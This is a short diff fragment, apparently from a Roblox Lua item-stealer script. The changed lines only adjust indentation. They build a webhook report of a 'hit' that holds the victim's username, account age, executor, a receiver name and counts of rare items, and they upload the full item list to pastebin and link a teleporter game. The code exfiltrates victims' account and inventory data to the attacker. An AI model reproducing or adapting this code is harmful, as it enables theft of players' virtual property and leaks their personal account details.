@@ -1077,9 +1077,9 @@ local WebHookEmbed = CreateEmbed(
     11220,
     {
         {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
-{name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
-{name = "```Hit List```", value = "[Click Here for List]("..pastebin(EverythingString)..")"},
-{name = "```Teleporter```", value = "[Teleporter](https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER)"}
+        {name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
+        {name = "```Hit List```", value = "[Click Here for List]("..pastebin(EverythingString)..")"},
+        {name = "```Teleporter```", value = "[Teleporter](https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER)"}
     }
 )
 
